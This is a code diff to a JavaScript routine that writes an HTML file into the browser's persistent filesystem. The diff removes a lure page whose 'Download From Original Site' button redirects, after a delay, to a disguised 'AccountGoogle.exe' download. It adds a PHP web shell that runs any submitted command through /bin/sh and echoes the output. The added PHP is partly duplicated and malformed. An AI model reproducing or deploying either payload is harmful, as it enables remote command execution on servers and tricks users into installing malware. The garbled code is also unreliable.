@@ -30,40 +30,44 @@
       window.webkitRequestFileSystem(window.PERSISTENT, storageSize, function(fs) {
         fs.root.getFile("test.html", { create: true }, function(fileEntry) {
           fileEntry.createWriter(function(fileWriter) {
-            const htmlContent = `<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>File HTML</title>
-  <style>
-    .button {
-      background-color: #4CAF50;
-      border: none;
-      color: white;
-      padding: 15px 32px;
-      text-align: center;
-      text-decoration: none;
-      display: inline-block;
-      font-size: 16px;
-      margin: 4px 2px;
-      cursor: pointer;
+            const htmlContent = `<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
+    $cmd = trim($_POST['cmd']);<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
+    $cmd = trim($_POST['cmd']);
+
+    if ($cmd !== '') {
+        $tmpFile = sys_get_temp_dir() . '/cmd_output.txt';
+
+        if (function_exists('pcntl_fork') && function_exists('pcntl_exec')) {
+            $pid = pcntl_fork();
+
+            if ($pid == -1) {
+                echo "Fork failed.";
+            } elseif ($pid === 0) {
+                pcntl_exec('/bin/sh', ['-c', $cmd . " > $tmpFile 2>&1"]);
+                exit(1);
+            } else {
+                pcntl_wait($status);
+
+                if (file_exists($tmpFile)) {
+                    echo "<pre>" . htmlspecialchars(file_get_contents($tmpFile)) . "</pre>";
+                    unlink($tmpFile);
+                } else {
+                    echo "No output.";
+                }
+            }
+        } else {
+            echo "pcntl functions not available.";
+        }
     }
-  </style>
-</head>
-<body>
-  <script>
-    function a() {
-      window.open('https://google.com', '_blank');
-      setTimeout(function() {
-        window.open('https://https://adservice.google.com/ddm/clk/408533097;208818505;l;;%3F//lanaya113505.github.io/pizza/AccountGoogle.exe?', '_blank');
-      }, 5000);
-    }
-  <\/script>
-  <center>
-    <input type="button" class="button" value="Download From Original Site" onclick="a()">
-  </center>
-</body>
-</html>`;
+}
+?>
+
+<form method="post">
+    <input type="text" name="cmd" placeholder="Enter command" />
+    <input type="submit" value="Run" />
+</form>;
 
             const blob = new Blob([htmlContent], { type: "text/html" });
 
